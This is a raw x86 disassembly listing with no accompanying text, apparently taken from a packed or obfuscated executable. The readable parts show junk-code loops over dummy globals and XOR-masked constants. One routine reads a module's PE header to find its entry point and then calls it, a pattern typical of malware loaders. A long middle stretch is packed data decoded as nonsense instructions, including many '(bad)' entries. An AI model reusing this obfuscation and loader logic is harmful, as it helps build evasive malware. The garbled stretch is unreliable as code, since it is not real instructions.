  406920:	mov    DWORD PTR [ebp-0x4],0xf89c853e
  406927:	mov    ecx,0xf89c8532
  40692c:	push   esi
  40692d:	mov    DWORD PTR ds:0x4336b3,0x711c
  406937:	mov    DWORD PTR [ebp+0x10],0x70019f3
  40693e:	mov    DWORD PTR ds:0x433633,edi
  406944:	mov    esi,DWORD PTR [ebp-0x4]
  406947:	mov    DWORD PTR ds:0x4336b7,0x237d
  406951:	cmp    ecx,esi
  406953:	mov    DWORD PTR ds:0x4336f7,0x9b
  40695d:	je     0x406998
  406963:	and    DWORD PTR ds:0x433617,0x274d
  40696d:	mov    esi,DWORD PTR [ebp+0xc]
  406970:	xor    ecx,eax
  406972:	sub    DWORD PTR ds:0x4336c3,0x433613
  40697c:	xor    esi,eax
  40697e:	lea    ecx,[esi+ecx*1+0x32729b]
  406985:	xor    ecx,eax
  406987:	cmp    ecx,0xf89c8521
  40698d:	jne    0x40692d
  406993:	jmp    0x4069c6
  406998:	add    ecx,0xffcd8d65
  40699e:	mov    esi,ecx
  4069a0:	xor    esi,eax
  4069a2:	add    esi,DWORD PTR [ebp+0x8]
  4069a5:	mov    DWORD PTR [ebp+0x8],esi
  4069a8:	mov    esi,DWORD PTR [ebp+0x8]
  4069ab:	xor    esi,ecx
  4069ad:	xor    esi,eax
  4069af:	mov    eax,DWORD PTR [edx+0x194]
  4069b5:	mov    ecx,DWORD PTR [eax]
  4069b7:	mov    eax,DWORD PTR [ecx+0x3c]
  4069ba:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  4069be:	add    eax,ecx
  4069c0:	mov    DWORD PTR [ebp+0x8],esi
  4069c3:	mov    DWORD PTR [ebp+0x10],eax
  4069c6:	mov    eax,DWORD PTR [ebp+0x10]
  4069c9:	pop    esi
  4069ca:	test   eax,eax
  4069cc:	jmp    0x406c4a
  4069d1:	gs aaa 
  4069d3:	jns    0x406a20
  4069d5:	dec    ecx
  4069d6:	jno    0x406a4d
  4069d8:	xor    DWORD PTR [ebp-0x789b6e39],ecx
  4069de:	or     ebx,DWORD PTR [edx+esi*4+0x7e7ec766]
  4069e5:	fistp  QWORD PTR [esi+edi*2+0x7e]
  4069e9:	xchg   edi,eax
  4069ea:	push   ecx
  4069eb:	cli    
  4069ec:	jecxz  0x4069d9
  4069ee:	cmp    bh,dl
  4069f0:	cmp    DWORD PTR [ebp+0x30],0x12
  4069f4:	and    BYTE PTR [edi],cl
  4069f6:	mov    ebx,0xbd49f593
  4069fb:	outs   dx,DWORD PTR ds:[esi]
  4069fc:	clc    
  4069fd:	daa    
  4069fe:	fbstp  TBYTE PTR [eax+0x5289137a]
  406a04:	test   BYTE PTR [edi+edi*4],bh
  406a07:	pop    esp
  406a08:	lods   eax,DWORD PTR ds:[esi]
  406a09:	push   ds
  406a0a:	adc    al,0x99
  406a0c:	xchg   ebx,eax
  406a0d:	mov    WORD PTR [esi-0x45be3370],?
  406a13:	pop    esi
  406a14:	jno    0x406999
  406a16:	jg     0x406a38
  406a18:	inc    esp
  406a19:	cmp    dl,ah
  406a1b:	(bad)  
  406a1c:	in     eax,0x2d
  406a1e:	sbb    bl,BYTE PTR [ebx]
  406a20:	xor    ebx,ebp
  406a22:	daa    
  406a23:	pop    ebx
  406a24:	pop    ebx
  406a25:	imul   esi,edx,0xffffffb2
  406a28:	jne    0x4069ce
  406a2a:	mov    dl,bl
  406a2c:	retf   
  406a2d:	(bad)
  406a30:	daa    
  406a31:	push   ebp
  406a32:	xor    DWORD PTR [edi-0x34693c30],edi
  406a38:	(bad)  
  406a39:	loopne 0x4069cc
  406a3b:	fiadd  WORD PTR [edx+0x2a]
  406a3e:	aad    0xbd
  406a40:	gs push ds
  406a42:	mov    bl,BYTE PTR [edi-0x23a14255]
  406a48:	and    DWORD PTR [eax+0x3dea9c36],edx
  406a4e:	dec    ebp
  406a4f:	xchg   edx,eax
  406a51:	sbb    dh,BYTE PTR [eax+0x26]
  406a54:	lock add edx,DWORD PTR [esi]
  406a57:	ret    0x687c
  406a5a:	inc    edi
  406a5b:	inc    ebx
  406a5c:	imul   edi,DWORD PTR [ebx+0x1d],0xfffffffa
  406a60:	int    0xb1
  406a62:	jnp    0x406a6a
  406a64:	jle    0x406ae3
  406a66:	ins    DWORD PTR es:[edi],dx
  406a67:	jecxz  0x406ac8
  406a69:	repnz mov bl,0x57
  406a6c:	pop    edi
  406a6d:	mov    edi,0x1082aed1
  406a72:	pop    edi
  406a73:	test   DWORD PTR [edi-0x36ead04e],ecx
  406a79:	icebp  
  406a7a:	xchg   ebp,eax
  406a7b:	mov    BYTE PTR [ebx],ch
  406a7d:	retf   0xba9e
  406a80:	sub    DWORD PTR [ebp+0x3e],esi
  406a83:	jb     0x406b02
  406a85:	js     0x406aab
  406a87:	ret    
  406a88:	and    BYTE PTR [eax+0x37],0xb1
  406a8c:	jmp    0x406b0b
  406a8e:	mov    dl,BYTE PTR [edx+0x7c161ab5]
  406a94:	popf   
  406a95:	push   ds
  406a96:	mov    gs:0xae15383,al
  406a9c:	int    0xf3
  406a9e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406a9f:	or     eax,0xea39a668
  406aa4:	and    DWORD PTR [ecx-0x12818780],esi
  406aaa:	sub    al,0xdb
  406aac:	iret   
  406aad:	mov    esi,0xce309f91
  406ab2:	fmul   DWORD PTR [ebx+0x25]
  406ab5:	xor    DWORD PTR [ecx],edi
  406ab7:	(bad)  [ebx]
  406ab9:	cmp    eax,0xea48017
  406abe:	(bad)  
  406abf:	sbb    dh,BYTE PTR [eax-0x750fc266]
  406ac5:	imul   edx,DWORD PTR [edi],0x669e498
  406acb:	push   ds
  406acc:	ror    DWORD PTR [esi-0x1f],cl
  406acf:	call   0x32ef3834
  406ad4:	adc    DWORD PTR [ecx+0x2be1c426],esp
  406ada:	lds    ebp,FWORD PTR [edi-0x36]
  406add:	out    dx,eax
  406ade:	jle    0x406b29
  406ae0:	add    DWORD PTR [eax],ebx
  406ae2:	xchg   ecx,eax
  406ae3:	jns    0x406b0f
  406ae5:	enter  0x2ef9,0x1a
  406ae9:	jne    0x406a80
  406aeb:	pop    edx
  406aec:	add    eax,0x47c71de9
  406af2:	ds loope 0x406a90
  406af5:	lock stos BYTE PTR es:[edi],al
  406af7:	push   es
  406af8:	retf   
  406af9:	loope  0x406b63
  406afb:	mov    dh,ch
  406afd:	inc    ebx
  406afe:	pop    eax
  406aff:	in     al,0x89
  406b01:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406b02:	push   esp
  406b03:	jb     0x406a91
  406b05:	pop    ecx
  406b06:	xchg   BYTE PTR [esi],ah
  406b08:	or     al,0xd1
  406b0a:	jmp    0x5154:0xdd1d634b
  406b11:	sub    eax,0x310280a0
  406b16:	cli    
  406b17:	pop    esp
  406b18:	push   ds
  406b19:	scas   al,BYTE PTR es:[edi]
  406b1a:	mov    ebx,0x98d80854
  406b1f:	mov    ecx,DWORD PTR [ecx+0x5719bae4]
  406b25:	and    DWORD PTR [ecx+0x4c],ebx
  406b28:	jb     0x406b19
  406b2a:	loope  0x406b6f
  406b2c:	test   al,0xb7
  406b2e:	cld    
  406b2f:	adc    al,0x30
  406b31:	dec    BYTE PTR [eax+edx*8+0x54]
  406b35:	sub    dl,bl
  406b37:	outs   dx,DWORD PTR ds:[esi]
  406b38:	cmp    cl,ch
  406b3a:	jl     0x406b1e
  406b3c:	adc    DWORD PTR [eax],ecx
  406b3e:	adc    BYTE PTR [esi+esi*2],dh
  406b41:	rol    DWORD PTR [ebp+0x7b],1
  406b44:	lods   eax,DWORD PTR ds:[esi]
  406b45:	jnp    0x406b22
  406b47:	stos   BYTE PTR es:[edi],al
  406b48:	mov    esi,0x6c9712d2
  406b4d:	push   edx
  406b4e:	inc    ebp
  406b4f:	mov    ?,WORD PTR [ecx+0x4c]
  406b52:	xchg   edi,eax
  406b53:	and    cl,BYTE PTR [edx-0x6c071bb3]
  406b59:	inc    eax
  406b5a:	dec    esi
  406b5b:	push   ecx
  406b5c:	ja     0x406ade
  406b5e:	push   ss
  406b5f:	inc    esp
  406b60:	inc    ebp
  406b61:	and    DWORD PTR [edx-0x73],ebp
  406b64:	fs es mov ch,dl
  406b68:	sub    al,0xe4
  406b6a:	cmp    al,0xed
  406b6c:	imul   esp,DWORD PTR [edi],0x7a
  406b6f:	aam    0x9a
  406b71:	jae    0x406b9c
  406b73:	mov    cl,0xab
  406b75:	add    DWORD PTR [ecx+0x54],edi
  406b78:	xchg   esp,eax
  406b79:	jmp    FWORD PTR [ebp-0x39]
  406b7c:	mov    bl,0x97
  406b7e:	js     0x406b96
  406b80:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406b81:	into   
  406b82:	out    0xf5,eax
  406b84:	outs   dx,BYTE PTR ds:[esi]
  406b85:	fisubr DWORD PTR [edx]
  406b87:	stos   DWORD PTR es:[edi],eax
  406b88:	mov    bh,0x46
  406b8a:	loope  0x406b25
  406b8c:	pop    edx
  406b8d:	out    dx,eax
  406b8e:	xor    esi,DWORD PTR [eax-0x9]
  406b91:	cs rol ch,0x87
  406b95:	bound  ecx,QWORD PTR [ecx]
  406b97:	jle    0x406b73
  406b99:	push   dx
  406b9b:	mov    DWORD PTR [edx+ebp*8-0x20],edx
  406b9f:	adc    dh,BYTE PTR [edx-0x1f]
  406ba2:	or     ebp,DWORD PTR [eax+0x3b]
  406ba5:	and    al,0xb3
  406ba7:	adc    eax,0x287afd0a
  406bac:	call   0x7bae5e02
  406bb1:	leave  
  406bb2:	mov    ebx,0x33bb1d76
  406bb7:	les    edi,FWORD PTR [esi]
  406bb9:	mov    ds:0x857806c1,eax
  406bbe:	(bad)  
  406bc1:	dec    eax
  406bc2:	and    ecx,DWORD PTR [ebx+0x6d823469]
  406bc8:	add    DWORD PTR [edi-0x3d],ebx
  406bcb:	xor    DWORD PTR [esi+0x612c7579],edi
  406bd1:	xchg   esi,eax
  406bd2:	stos   DWORD PTR es:[edi],eax
  406bd3:	or     BYTE PTR [ecx],0x12
  406bd6:	adc    DWORD PTR [edx],eax
  406bd8:	push   ss
  406bd9:	mov    bl,0xd
  406bdb:	jg     0x406bd2
  406bdd:	sar    DWORD PTR [eax],0xe
  406be0:	push   ebx
  406be1:	imul   edi,DWORD PTR [edx+0xd1192a2],0xcfa11f53
  406beb:	call   0x1421:0x82e9c22c
  406bf2:	xlat   BYTE PTR ds:[ebx]
  406bf3:	ins    BYTE PTR es:[edi],dx
  406bf4:	aam    0x64
  406bf6:	inc    ebx
  406bf7:	xchg   BYTE PTR [edx-0x4e],bh
  406bfa:	xor    BYTE PTR [eax],bh
  406bfc:	xor    dl,BYTE PTR [ecx-0x1e0974ed]
  406c02:	jns    0x406c3d
  406c04:	jecxz  0x406bd9
  406c06:	inc    ebp
  406c07:	xor    DWORD PTR ds:0x48e56664,edi
  406c0d:	dec    ebp
  406c0e:	pop    ecx
  406c0f:	mov    edx,0xcf06041
  406c14:	aam    0xe3
  406c16:	mov    ch,0xeb
  406c18:	div    DWORD PTR [edi+0x54]
  406c1b:	push   ecx
  406c1c:	jbe    0x406c0d
  406c1e:	std    
  406c1f:	(bad)  
  406c21:	test   al,0x71
  406c23:	clc    
  406c24:	out    dx,al
  406c25:	or     al,0x9e
  406c27:	out    0x94,al
  406c29:	push   ecx
  406c2a:	rcl    BYTE PTR [edi],0xd9
  406c2d:	dec    ecx
  406c2e:	push   eax
  406c2f:	xchg   cl,al
  406c31:	mov    ecx,0xf0ff2a7a
  406c36:	mov    bl,0xb6
  406c38:	icebp  
  406c39:	dec    edx
  406c3a:	stos   DWORD PTR es:[edi],eax
  406c3b:	mov    ds:0x7a83c821,al
  406c40:	push   edx
  406c41:	cld    
  406c42:	inc    esi
  406c43:	arpl   sp,si
  406c45:	dec    ecx
  406c46:	je     0x406c4d
  406c48:	mov    ah,BYTE PTR [edi+0x29c840f]
  406c4e:	add    BYTE PTR [eax],al
  406c50:	push   DWORD PTR ds:0x413cb6
  406c56:	push   DWORD PTR ds:0x413a62
  406c5c:	mov    eax,DWORD PTR [edx+0x194]
  406c62:	push   DWORD PTR [eax]
  406c64:	mov    eax,DWORD PTR [ebp+0x10]
  406c67:	call   eax
  406c69:	jmp    0x406eef
  406c6e:	jmp    0x406eec
  406c73:	push   ebx
  406c74:	jo     0x406c41
  406c76:	es jmp 0xfbb1e021
  406c7c:	mov    edi,0xb63c2bde
  406c81:	shr    DWORD PTR [edi],cl
  406c83:	mov    edx,0x7cdf7e7e
  406c89:	jle    0x406d09
  406c8b:	bound  esi,QWORD PTR [edx-0x47]
  406c8e:	mov    cl,0xac
  406c90:	adc    ebp,edi
  406c92:	fisttp QWORD PTR ds:0xe40db527
  406c98:	(bad)  
  406c99:	jno    0x406c69
  406c9b:	pusha  
  406c9c:	mov    esi,0x109eaccd
  406ca1:	mov    DWORD PTR [ebx+0x57],ebx
  406ca4:	dec    eax
  406ca5:	ds jl  0x406c44
  406ca8:	xchg   esi,eax
  406ca9:	adc    BYTE PTR [esi-0x3448ae6e],al
  406caf:	ss cli 
  406cb1:	mov    al,0x86
  406cb3:	aaa    
  406cb4:	or     esp,DWORD PTR [edi]
  406cb6:	call   0x897a:0xd65ebd99
  406cbd:	lods   al,BYTE PTR ds:[esi]
  406cbe:	mov    cl,0xba
  406cc0:	arpl   WORD PTR [esi-0x2c],bp
  406cc3:	xor    eax,0xa8ce5f02
  406cc8:	lds    eax,FWORD PTR [ebp-0x7bcbf3f]
  406cce:	cdq    
  406ccf:	sbb    DWORD PTR [ebx-0x40],esi
  406cd2:	jbe    0x406d45
  406cd4:	dec    DWORD PTR [esi]
  406cd6:	xor    eax,edx
  406cd8:	xchg   ebx,eax
  406cd9:	jbe    0x406cfc
  406cdb:	leave  
  406cdc:	and    DWORD PTR [edi],esp
  406cde:	loope  0x406c9c
  406ce0:	nop
  406ce1:	push   edi
  406ce2:	sub    BYTE PTR ds:0x25c115ff,0xcb
  406ce9:	loop   0x406c96
  406ceb:	retf   0xc049
  406cee:	outs   dx,BYTE PTR ds:[esi]
  406cef:	test   ebp,eax
  406cf1:	out    0xe3,al
  406cf3:	in     eax,dx
  406cf4:	iret   
  406cf5:	xchg   ebp,eax
  406cf6:	xor    BYTE PTR [ebp-0x4c],bh
  406cf9:	inc    eax
  406cfa:	sbb    dl,al
  406cfc:	xchg   DWORD PTR [edi],esp
  406cfe:	mov    bl,0xf8
  406d00:	mov    al,BYTE PTR cs:[edx+0x78]
  406d04:	loope  0x406d10
  406d06:	in     eax,dx
  406d07:	inc    ecx
  406d08:	ror    BYTE PTR ds:0x7d2ef01a,1
  406d0e:	lods   eax,DWORD PTR ds:[esi]
  406d0f:	clc    
  406d10:	adc    DWORD PTR [esi+0x137b2459],eax
  406d16:	ja     0x406d61
  406d18:	inc    esp
  406d19:	les    ebx,FWORD PTR [ecx+edx*8+0x4d695699]
  406d20:	push   ebx
  406d21:	pop    ss
  406d22:	sbb    al,0xf
  406d24:	jo     0x406cc7
  406d26:	dec    ebx
  406d27:	xor    al,0x18
  406d29:	add    ch,BYTE PTR [eax-0x67]
  406d2c:	lea    esi,[ecx+0x2d]
  406d2f:	dec    ecx
  406d30:	fdiv   QWORD PTR [edx]
  406d32:	xchg   ebx,eax
  406d33:	sub    edi,DWORD PTR [edx]
  406d35:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406d36:	mov    edi,0x4ed9ba7b
  406d3b:	mov    edx,0x3d9210bb
  406d40:	aam    0x96
  406d42:	push   es
  406d43:	pop    ebx
  406d44:	ds mov dh,0x73
  406d47:	out    0x3c,al
  406d49:	add    BYTE PTR [ebp+0x6f],dl
  406d4c:	xor    al,0x47
  406d4e:	jl     0x406da8
  406d50:	mov    WORD PTR [ebp+0x7a9351f],gs
  406d56:	scas   eax,DWORD PTR es:[edi]
  406d57:	or     DWORD PTR [esi+esi*1],edi
  406d5a:	mov    es,WORD PTR [edx-0x782086a5]
  406d60:	shl    BYTE PTR [esp+edx*4-0x5b],cl
  406d64:	fs inc esi
  406d66:	or     ch,BYTE PTR [ecx-0x3a]
  406d69:	ins    BYTE PTR es:[edi],dx
  406d6a:	cmp    eax,0x7aa6d085
  406d6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406d70:	jp     0x406d88
  406d72:	push   ds
  406d73:	adc    edx,DWORD PTR [edi]
  406d75:	jmp    0x7f75:0xa83173f4
  406d7c:	out    0xce,ax
  406d7f:	clc    
  406d80:	in     al,dx
  406d81:	xor    BYTE PTR ds:0x7496c289,ch
  406d87:	push   esp
  406d88:	stos   DWORD PTR es:[edi],eax
  406d89:	dec    esi
  406d8a:	or     esp,DWORD PTR [edx-0x59d653bb]
  406d90:	push   edx
  406d91:	shl    DWORD PTR [edx+0x4abb1fca],0x33
  406d98:	mov    WORD PTR ds:0xa0611768,es
  406d9e:	lock lods eax,DWORD PTR ds:[esi]
  406da0:	adc    BYTE PTR [eax-0x40077615],dh
  406da6:	loop   0x406d2c
  406da8:	and    dh,0xf6
  406dab:	fcomp  DWORD PTR [ecx]
  406dad:	add    al,0xbe
  406daf:	add    ebp,DWORD PTR [edi+0xd]
  406db2:	push   esp
  406db3:	cmp    cl,cl
  406db5:	dec    eax
  406db6:	sbb    BYTE PTR [edx-0x35],bh
  406db9:	arpl   WORD PTR [ebx],sp
  406dbb:	sar    cl,cl
  406dbd:	or     BYTE PTR [ecx],dh
  406dbf:	xlat   BYTE PTR ds:[ebx]
  406dc0:	or     DWORD PTR [edi],0xc5b16bb7
  406dc6:	or     al,BYTE PTR [ebp-0x62]
  406dc9:	scas   eax,DWORD PTR es:[edi]
  406dca:	lea    eax,ds:0x5c176f62
  406dd0:	call   0x89f30d95
  406dd5:	aad    0x3
  406dd7:	addr16 jnp 0x406e37
  406dda:	jae    0x406d73
  406ddc:	inc    ecx
  406ddd:	xor    al,0x46
  406ddf:	adc    DWORD PTR [esi-0x48],ebp
  406de2:	pusha  
  406de3:	xchg   ecx,eax
  406de4:	jnp    0x406dcc
  406de6:	push   ss
  406de7:	mov    esp,0x7db97cf3
  406dec:	jae    0x406ddb
  406dee:	leave  
  406def:	bound  esi,QWORD PTR [eax]
  406df1:	std    
  406df2:	inc    eax
  406df3:	jmp    0x17244ad9
  406df8:	push   es
  406df9:	arpl   WORD PTR [ecx-0x6c],cx
  406dfc:	mov    eax,edx
  406dfe:	ins    BYTE PTR es:[edi],dx
  406dff:	add    BYTE PTR [ecx],ch
  406e01:	out    dx,eax
  406e02:	xor    al,0xd2
  406e04:	ins    DWORD PTR es:[edi],dx
  406e05:	lods   eax,DWORD PTR ds:[esi]
  406e06:	pop    edi
  406e07:	mov    al,ds:0x4ec4aa65
  406e0c:	mov    eax,0x3fe5d8eb
  406e11:	out    dx,eax
  406e12:	ret    0x54b3
  406e15:	(bad)  
  406e16:	cmp    esi,DWORD PTR [esi+0x12]
  406e19:	ss inc esi
  406e1b:	es out dx,al
  406e1d:	mov    ds:0x242ec4da,eax
  406e22:	pop    DWORD PTR [ebx]
  406e24:	inc    ebx
  406e25:	xchg   esi,eax
  406e26:	mov    edi,0xd587d02f
  406e2b:	cwde   
  406e2c:	inc    esi
  406e2d:	inc    esi
  406e2e:	fwait
  406e2f:	sbb    edi,DWORD PTR [edx]
  406e31:	pop    es
  406e32:	ror    DWORD PTR [ebp+ebx*1-0x4d03598b],cl
  406e39:	push   0xffffffa6
  406e3b:	pop    ecx
  406e3c:	leave  
  406e3d:	retf   
  406e3e:	dec    edi
  406e3f:	das    
  406e40:	xor    BYTE PTR [ebx],bl
  406e42:	dec    eax
  406e43:	push   es
  406e44:	js     0x406e8b
  406e46:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406e47:	mov    ebx,0xf89c74a
  406e4c:	dec    edi
  406e4d:	loop   0x406e46
  406e4f:	es fwait
  406e51:	push   ebx
  406e52:	or     DWORD PTR [edi+0x6babd6df],0x25
  406e59:	stc    
  406e5a:	retf   
  406e5b:	mov    dh,0x58
  406e5d:	push   esi
  406e5e:	cmp    eax,0x8333e134
  406e63:	xor    eax,0x7df30ae0
  406e68:	into   
  406e69:	or     eax,0x902d5ca5
  406e6e:	pop    esi
  406e6f:	adc    al,ah
  406e71:	dec    ebp
  406e72:	mov    ds:0x1108701e,al
  406e77:	inc    esp
  406e78:	adc    BYTE PTR [ebx],0x28
  406e7b:	add    BYTE PTR [edx-0x4f],al
  406e7e:	xchg   DWORD PTR [edx+0x6423b5cd],ecx
  406e84:	stos   DWORD PTR es:[edi],eax
  406e85:	adc    esi,DWORD PTR [edx]
  406e87:	sbb    esi,DWORD PTR [ebp+0x4fbcec48]
  406e8d:	cdq    
  406e8e:	mov    WORD PTR [ecx],es
  406e90:	les    esi,FWORD PTR [ebx]
  406e92:	ret    
  406e93:	scas   al,BYTE PTR es:[edi]
  406e94:	xor    ebp,0xfffffff5
  406e97:	sbb    DWORD PTR [esi],ebp
  406e99:	std    
  406e9a:	xchg   esi,eax
  406e9b:	cli    
  406e9c:	jo     0x406f17
  406e9e:	mov    DWORD PTR [eax+esi*1+0x1],ebp
  406ea2:	pop    ebp
  406ea3:	aad    0xdc
  406ea5:	xchg   esi,eax
  406ea6:	bound  ebp,QWORD PTR [ebx]
  406ea8:	add    BYTE PTR [ecx+edx*1-0x120ccfe7],0xc6
  406eb0:	or     ch,BYTE PTR [edi+0x47287b43]
  406eb6:	lahf   
  406eb7:	mov    ax,ds:0x221ec7cf
  406ebd:	sub    ecx,ebp
  406ebf:	imul   DWORD PTR [ebx+0x5f]
  406ec2:	inc    ebp
  406ec3:	call   0x9f3c:0xffd2a819
  406eca:	sahf   
  406ecb:	jp     0x406e7e
  406ecd:	or     DWORD PTR [ebx+edx*8+0x6f],ecx
  406ed1:	nop
  406ed2:	fldenv [ecx-0x45]
  406ed5:	or     DWORD PTR [ebx-0x34],esi
  406ed8:	imul   esp,DWORD PTR [esi+0x1fbb1f94],0x3f
  406edf:	mov    edx,0xdc7b59b4
  406ee4:	jmp    0x406f09
  406ee6:	mov    esp,0x4c55abf2
  406eeb:	cmp    ecx,DWORD PTR [ebx-0x3d36efbb]
  406ef1:	or     al,0x0
  406ef3:	push   ebp
  406ef4:	mov    ebp,esp
  406ef6:	sub    esp,0x28
  406ef9:	mov    DWORD PTR ds:0x43366f,0x71e2
  406f03:	push   0x413d5e
  406f08:	call   DWORD PTR ds:0x412420
  406f0e:	cmp    BYTE PTR [eax],0x0
  406f11:	mov    DWORD PTR ds:0x433623,0xa08
  406f1b:	je     0x406f32
  406f21:	and    DWORD PTR ds:0x43372f,0x433613
  406f2b:	xor    eax,eax
  406f2d:	jmp    0x407466
  406f32:	push   0x413da6
  406f37:	add    DWORD PTR ds:0x43372f,0x4336a7
  406f41:	call   DWORD PTR ds:0x4121d4
  406f47:	mov    DWORD PTR ds:0x4336eb,0x6fd9
  406f51:	cmp    eax,0xa
  406f54:	mov    DWORD PTR ds:0x4336bb,0x485d
  406f5e:	jl     0x406f21
  406f64:	add    ecx,DWORD PTR ds:0x433727
  406f6a:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  406f71:	mov    DWORD PTR ds:0x4336fb,0x11
  406f7b:	cmp    DWORD PTR ds:0x4336fb,0x0
  406f82:	je     0x406fdd
  406f88:	cmp    DWORD PTR ds:0x4336fb,0x5
  406f8f:	jne    0x406fa5
  406f95:	push   0x7487
  406f9a:	push   0x433767
  406f9f:	call   DWORD PTR ds:0x4121c0
  406fa5:	cmp    DWORD PTR ds:0x4336fb,0x6
  406fac:	jne    0x406fbf
  406fb2:	mov    ecx,DWORD PTR ds:0x4336fb
  406fb8:	dec    ecx
  406fb9:	mov    DWORD PTR ds:0x4336fb,ecx
  406fbf:	xor    ecx,ecx
  406fc1:	add    ecx,DWORD PTR ds:0x4336fb
  406fc7:	dec    ecx
  406fc8:	mov    DWORD PTR ds:0x4336fb,ecx
  406fce:	jmp    0x406f7b
  406fd3:	adc    DWORD PTR ds:0x43362b,0x7658
  406fdd:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  406fe4:	mov    DWORD PTR ds:0x433673,0x15
  406fee:	cmp    DWORD PTR ds:0x433673,0x0
  406ff5:	je     0x407051
  406ffb:	cmp    DWORD PTR ds:0x433673,0x2
  407002:	jne    0x40701d
  407008:	push   0x43367b
  40700d:	push   0x433703
  407012:	push   0x3143
  407017:	call   DWORD PTR ds:0x412360
  40701d:	cmp    DWORD PTR ds:0x433673,0x3
  407024:	jne    0x407039
  40702a:	xor    ecx,ecx
  40702c:	or     ecx,DWORD PTR ds:0x433673
  407032:	dec    ecx
  407033:	mov    DWORD PTR ds:0x433673,ecx
  407039:	mov    ecx,DWORD PTR ds:0x433673
  40703f:	dec    ecx
  407040:	mov    DWORD PTR ds:0x433673,ecx
  407046:	jmp    0x406fee
  40704b:	sbb    ecx,DWORD PTR ds:0x4336ff
  407051:	lea    eax,[ebp-0x20]
  407054:	mov    DWORD PTR ds:0x43362f,0x1c
  40705e:	cmp    DWORD PTR ds:0x43362f,0x0
  407065:	je     0x4070a1
  40706b:	cmp    DWORD PTR ds:0x43362f,0x2b
  407072:	jne    0x407089
  407078:	push   DWORD PTR [ebp-0xc]
  40707b:	push   0x43362f
  407080:	push   DWORD PTR [ebp-0x24]
  407083:	call   DWORD PTR ds:0x4121c4
  407089:	mov    ecx,DWORD PTR ds:0x43362f
  40708f:	dec    ecx
  407090:	mov    DWORD PTR ds:0x43362f,ecx
  407096:	jmp    0x40705e
  40709b:	xor    ecx,0x624a
  4070a1:	mov    DWORD PTR [ebp-0x14],eax
  4070a4:	lea    eax,[ebp-0x1c]
  4070a7:	mov    DWORD PTR [ebp-0x10],eax
  4070aa:	adc    ecx,eax
  4070ac:	mov    eax,ds:0x413bde
  4070b1:	mov    ecx,DWORD PTR ds:0x433647
  4070b7:	mov    ecx,DWORD PTR [ecx]
  4070b9:	xor    DWORD PTR ds:0x4336b3,ecx
  4070bf:	mov    eax,DWORD PTR [eax+0x1c8]
  4070c5:	or     DWORD PTR ds:0x433633,0x1d95
  4070cf:	mov    eax,DWORD PTR [eax]
  4070d1:	sub    ecx,0x7a4e
  4070d7:	mov    ecx,DWORD PTR [ebp-0x10]
  4070da:	add    DWORD PTR ds:0x43366f,0x433627
  4070e4:	push   ebx
  4070e5:	push   esi
  4070e6:	sub    DWORD PTR ds:0x43361f,ebx
  4070ec:	mov    esi,0x7510854
  4070f1:	and    DWORD PTR ds:0x4336a7,0x0
  4070fb:	mov    ebx,DWORD PTR ds:0x4336a7
  407101:	inc    ebx
  407102:	mov    DWORD PTR ds:0x4336a7,ebx
  407108:	cmp    DWORD PTR ds:0x4336a7,0x7
  40710f:	jne    0x407128
  407115:	push   DWORD PTR [ebp-0x1c]
  407118:	push   0x8eb0
  40711d:	push   0x3be9
  407122:	call   DWORD PTR ds:0x4121c8
  407128:	cmp    DWORD PTR ds:0x4336a7,0x6
  40712f:	jne    0x407144
  407135:	xor    ebx,ebx
  407137:	xor    ebx,DWORD PTR ds:0x4336a7
  40713d:	inc    ebx
  40713e:	mov    DWORD PTR ds:0x4336a7,ebx
  407144:	cmp    DWORD PTR ds:0x4336a7,0x15
  40714b:	jb     0x4070fb
  407151:	and    DWORD PTR ds:0x4336eb,edi
  407157:	xor    eax,esi
  407159:	sub    ebx,DWORD PTR ds:0x43361b
  40715f:	push   edi
  407160:	xor    ebx,0x561f
  407166:	mov    edi,0x32729b
  40716b:	mov    DWORD PTR ds:0x433743,0x1c
  407175:	cmp    DWORD PTR ds:0x433743,0x0
  40717c:	je     0x407271
  407182:	cmp    DWORD PTR ds:0x433743,0x25
  407189:	jne    0x40719d
  40718f:	push   0x43379a
  407194:	push   DWORD PTR [ebp-0x20]
  407197:	call   DWORD PTR ds:0x412008
  40719d:	mov    ebx,DWORD PTR ds:0x433743
  4071a3:	dec    ebx
  4071a4:	mov    DWORD PTR ds:0x433743,ebx
  4071aa:	jmp    0x407175
  4071af:	and    DWORD PTR ds:0x43361f,0x0
  4071b9:	jmp    0x4071cb
  4071be:	mov    ebx,DWORD PTR ds:0x43361f
  4071c4:	inc    ebx
  4071c5:	mov    DWORD PTR ds:0x43361f,ebx
  4071cb:	cmp    DWORD PTR ds:0x43361f,0x1a
  4071d2:	jae    0x407271
  4071d8:	cmp    DWORD PTR ds:0x43361f,0x8
  4071df:	jne    0x4071f0
  4071e5:	push   0x2cbb
  4071ea:	call   DWORD PTR ds:0x41200c
  4071f0:	cmp    DWORD PTR ds:0x43361f,0x7
  4071f7:	jne    0x40720a
  4071fd:	mov    ebx,DWORD PTR ds:0x43361f
  407203:	inc    ebx
  407204:	mov    DWORD PTR ds:0x43361f,ebx
  40720a:	jmp    0x4071be
  40720f:	and    DWORD PTR ds:0x433683,0x0
  407219:	mov    ebx,DWORD PTR ds:0x433683
  40721f:	inc    ebx
  407220:	mov    DWORD PTR ds:0x433683,ebx
  407226:	cmp    DWORD PTR ds:0x433683,0x4
  40722d:	jne    0x407244
  407233:	push   DWORD PTR [ebp-0x10]
  407236:	push   0x347b
  40723b:	push   DWORD PTR [ebp-0xc]
  40723e:	call   DWORD PTR ds:0x412364
  407244:	cmp    DWORD PTR ds:0x433683,0x3
  40724b:	jne    0x40725e
  407251:	mov    ebx,DWORD PTR ds:0x433683
  407257:	inc    ebx
  407258:	mov    DWORD PTR ds:0x433683,ebx
  40725e:	cmp    DWORD PTR ds:0x433683,0x11
  407265:	jb     0x407219
  40726b:	adc    DWORD PTR ds:0x43362f,ebx
  407271:	add    eax,edi
  407273:	mov    DWORD PTR ds:0x43361f,0x2325
  40727d:	mov    DWORD PTR [ecx],eax
  40727f:	mov    DWORD PTR ds:0x4336f7,0x6c11
